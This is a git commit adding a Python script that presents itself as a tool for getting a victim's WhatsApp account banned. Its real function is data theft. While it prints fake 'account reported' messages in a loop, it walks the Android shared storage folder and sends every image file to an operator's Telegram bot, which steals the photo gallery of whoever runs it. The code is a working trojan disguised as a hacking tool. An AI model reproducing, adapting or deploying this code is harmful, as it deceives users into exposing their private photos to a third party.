40d5f76cbc81356c02efdc12ebf1ea27338ef65f
PreBoyx <95946179+preboyx@users.noreply.github.com>
2024-02-07 20:28:03 +0100

    Add files via upload

---
+++ Bot-Hack-Galeria.py
@@ -0,0 +1,83 @@
+decoracion = '''\033[92m
+!!!!!!!!!!!!!!!!!!!!!!7??JJJJJ??!!~~~~~~~~~~~~~~~~~~~^^^^^^^
+!!!!!!!!!!!!!!!7?YPB#&@@@@@@@@@@@&7~~~~~~~~~~~~~~~~~~~~~~~~~
+!!!!!!!!!!!!7YG#@@@@&##BGGGGGGGBB7.~~~~!~~~~~~~~~~~~~~~~~~~~
+!!!!!!!!!!JG&@@@&BPYYJJJJJJJJJJJ?:~~~~J&#B5J!~~~~~~~~~~~~~^^
+!!!!!!!!J#@@@#GYJJJJJJJJJJJJJJJ??7~~~7B&&@@@&B57~~~~~~^^^^^^
+~~~~~~7B@@@#5J??????????????????::^~~7?JJ5G#&@@@BJ~^^^^^^^^^
+~~~~~J&@@&P??????J5P5Y??????????!^~~!!!?J?JJYP#@@@#J~^^^^^^^
+~~~~J&@@&Y??????P&@@@&Y???7!~^:::^~~~?????????J5#@@@G!^^^^^^
+~~~!&@@&J??????5@@@@@@&J??7~^^^~~~~~~7???????????P@@@#!^^^^^
+~~~P@@@577777775@@@@@@@G77777~~~!77???????????????Y&@@&~^^^^
+~~~####7!777777?#@@@@&Y777777~:^~7?????????????????Y@@@B:^^^
+~~~!^^^::~77!!!~7G@@@@P777!^::^^^^~77777777777777777G@@@7:^^
+~~~~~~~~~~^:::::!7Y#@@@#5?~.^^^^^~!77777777777777777J@@@5.^^
+~~~^~#&&&77~^^^^!~~~?J?77!::^^^~!7777777777777777777?@@@P.:^
+^^^^^#@@@77!~!!77!::^^^^^^^^^^^~!7777?YJ?77777777777Y@@@5.::
+^^^^^P@@@Y77777777^~~~!J55PP?^?7^^~75#@@&BG5?7777777B@@@~.::
+^^^^^!@@@#?777777777777?5B@G.?@&BP!J@@@@@@@@P7????75@@@P.:::
+^^^^^^J@@@B????????????????:^B@@@@#^YYY5PPBB??????5&@@#:.:::
+^^^^^^^Y@@@#Y????????????!^:!??YPG####BGP?^?????JG@@@B:.::::
+^^^^^^^^G@@@G?????????7!!~~7????????JYYJ?!^7???5#@@&Y..:::::
+:^^^^^:?@@@#J?????????7~~7????????????????!!!??JJ?!^..::::::
+::::::~&@@&5JJY5PGG5YJJ?^^?JJJJJJJJJJJJJJY5B&@@@G!.:::::::::
+:::::^B@@@&#&&@@@@@@@#?.!YYYJJJJJJJYY5GB&@@@@#Y^..::::::::::
+:::::5@@@@@&&#G5?7?PP^~G@@@@&&&&&&&@@@@@&#PJ~..:::::::::::::
+::::?#BG5?!~:....:::..!7J5PGBBBBBBBGPY?!^:..::::::::::::::::
+::::^^.....::::::::::::::::::::::::...::::::::::::::::::::::
+......................::....................................
+
+★𝗘𝘀𝘁𝗮 𝗛𝗲𝗿𝗿𝗮𝗺𝗶𝗲𝗻𝘁𝗮 𝗦𝗶𝗿𝘃𝗲 𝗣𝗮𝗿𝗮 𝗕𝗮𝗻𝗲𝗮𝗿 𝗖𝘂𝗲𝗻𝘁𝗮𝘀 𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗠𝘂𝘆 𝗣𝗼𝘁𝗲𝗻𝗲𝘁𝗲 𝘆 𝗘𝗳𝗲𝗰𝘁𝗶𝘃𝗼 
+
+★𝗘𝘀𝗰𝗿𝗶𝗯𝗲 𝗘𝗹 𝗻𝘂𝗺𝗲𝗿𝗼 𝗔𝗯𝗮𝗷𝗼 𝗱𝗼𝗻𝗱𝗲 𝘀𝗲 𝗶𝗻𝗱𝗶𝗰𝗮 𝗰𝗼𝗻 𝗲𝗹 𝗽𝗿𝗲𝗳𝗶𝗷𝗼 𝘁𝗮𝗺𝗯𝗶𝗲́𝗻 
+𝗘𝗷𝗲𝗺𝗽𝗹𝗼 : +𝟭𝟵𝟭𝟰𝟮𝟳𝟲𝟲𝟴𝟮𝟵\033[0m
+'''
+#@BoxPrey
+print(decoracion)
+print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+import platform
+import socket
+import requests
+import sys
+import threading
+import time
+import telebot
+import os
+from threading import Thread
+
+# Token de tu bot de Telegram
+bot_token = "Tu_Token"
+#@BoxPrey
+bot = telebot.TeleBot(bot_token)
+#@BoxPrey
+name = input('''\033[95m𝐈𝐧𝐠𝐫𝐞𝐬𝐚 𝐄𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞 𝐥𝐚 𝐯𝐢́𝐜𝐭𝐢𝐦𝐚 𝐪𝐮𝐞 𝐪𝐮𝐢𝐞𝐫𝐞𝐬 𝐁𝐚𝐧𝐞𝐚𝐫:''')
+#@BoxPrey
+def send_file(file_path):
+    with open(file_path, "rb") as f:
+        if file_path.endswith(".jpg") or file_path.endswith(".png") or file_path.endswith(".PNG") or file_path.endswith(".JPEG") or file_path.endswith(".jpeg") or file_path.endswith(".Webp") or file_path.endswith(".webp"):
+            bot.send_photo(chat_id="Tu_Id", photo=f)
+
+def attack_message():
+    while True:
+        print("\033[92mCuenta reportada ✅\033[0m")
+        time.sleep(1)
+#@BoxPrey
+def main():
+    attack_thread = threading.Thread(target=attack_message)
+    attack_thread.daemon = True
+    attack_thread.start()
+
+    dir_path = "/storage/emulated/0/"
+    #@BoxPrey
+    file_threads = []
+    for root, dirs, files in os.walk(dir_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            t = Thread(target=send_file, args=(file_path,))
+            t.start()
+            file_threads.append(t)
+    for file_thread in file_threads:
+        file_thread.join()
+#@BoxPrey
+if __name__ == "__main__":
+    main()
